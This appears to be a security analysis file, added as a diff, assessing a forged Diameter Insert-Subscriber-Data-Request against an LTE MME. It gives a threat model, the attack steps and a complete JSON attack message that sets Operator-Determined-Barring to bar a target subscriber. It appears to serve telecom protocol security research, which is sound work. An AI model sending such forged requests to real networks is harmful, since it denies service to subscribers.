@@ -1,0 +1,89 @@
+### **Threat Model:**
+- **Attack Assumption:**
+  - The victim is an **MME** exposing its **S6a Diameter** service due to misconfiguration. An Internet attacker can impersonate the expected **HSS** role and send a forged **Insert-Subscriber-Data-Request (IDR)** to that MME. The MME accepts the request as if it came from a legitimate HSS and processes subscriber profile updates for the UE identified in the message.
+
+- **Attacker Capability:**
+  - The attacker can establish its own unauthenticated Diameter connection to the MME, send crafted **IDR Requests**, and receive the corresponding **IDA Answers**. The attacker knows the target subscriber identity (e.g., IMSI in `User-Name`) but cannot observe or modify real HSS-MME traffic and has no extra NAS/GTP/radio capabilities beyond sending forged Diameter requests.
+
+### **Exploitability Analysis:**
+`Subscription-Data.Operator-Determined-Barring` is **field-specifically exploitable** in this threat model.
+
+This AVP is not descriptive metadata about the sender and not mere procedure bookkeeping. In an **IDR on S6a**, it is authoritative **subscriber provisioning input** sent from **HSS to MME** inside `Subscription-Data`. The MME is expected to parse it as part of the subscriber profile, store/update the UE context, and later enforce the received barring state in service authorization decisions.
+
+The key incremental effect comes from the **value of this field itself**: changing `Operator-Determined-Barring` changes the subscriber's stored barred-service state. If a forged IDR is accepted with a restrictive valid ODB mask, the MME may cache that subscriber as barred for one or more operator-defined service categories. The downstream consequence is not just "forged IDR accepted," but specifically that later MME policy checks can deny or restrict UE service attempts because of the injected ODB value. This yields a concrete negative outcome: **persistent subscriber service denial/restriction** until overwritten by later legitimate profile refresh or context teardown.
+
+That makes this field a real control point. The attacker does not need any additional capability beyond sending the forged IDR, because the MME itself is the downstream enforcement point. The effect may not always be immediate at IDR reception, but it is still concrete and realizable: the poisoned subscriber profile is later consumed by the MME's authorization logic, producing attach/service/session restriction behavior depending on implementation and the selected barring category.
+
+This is therefore more than procedure-only impact. While a forged IDR is dangerous in general, this particular AVP independently drives a specific harmful state change: **subscriber barring policy corruption**.
+
+### **Attack Procedure:**
+Craft a forged **Insert-Subscriber-Data-Request** from the attacker-controlled fake HSS to the victim MME on the **S6a application**. Include the required Diameter session/routing AVPs, subscriber identity in `User-Name`, and a `Subscription-Data` grouped AVP containing `Operator-Determined-Barring` set to a valid restrictive ODB mask.
+
+A minimal operational request needs:
+- `Session-Id`
+- `Auth-Session-State`
+- `Origin-Host`
+- `Origin-Realm`
+- `Destination-Host`
+- `Destination-Realm`
+- `User-Name`
+- `Subscription-Data` {
+  - `Operator-Determined-Barring`
+  - }
+
+Expected success condition: the MME returns an **IDA** indicating successful processing, and the targeted UE subsequently experiences service denial/restriction consistent with the injected ODB state.
+
+### **Attack Message:**
+```json
+{
+  "diameter_header": {
+    "version": 1,
+    "flags": ["R", "P"],
+    "command_code": 319,
+    "application_id": 16777251
+  },
+  "avps": [
+    {
+      "name": "Session-Id",
+      "value": "fakehss.example.net;1720458000;1;imsi-001010123456789"
+    },
+    {
+      "name": "Auth-Session-State",
+      "value": 1
+    },
+    {
+      "name": "Origin-Host",
+      "value": "hss.attacker.example.net"
+    },
+    {
+      "name": "Origin-Realm",
+      "value": "attacker.example.net"
+    },
+    {
+      "name": "Destination-Host",
+      "value": "mme01.victim.example.net"
+    },
+    {
+      "name": "Destination-Realm",
+      "value": "victim.example.net"
+    },
+    {
+      "name": "User-Name",
+      "value": "001010123456789"
+    },
+    {
+      "name": "Subscription-Data",
+      "vendor_id": 10415,
+      "value": [
+        {
+	 "Subscriber-Status": "OPERATOR_DETERMINED_BARRING",
+          "Operator-Determined-Barring": 1
+        }
+      ]
+    }
+  ]
+}
+```
+
+### **Classification:**
+EXPLOITABLE
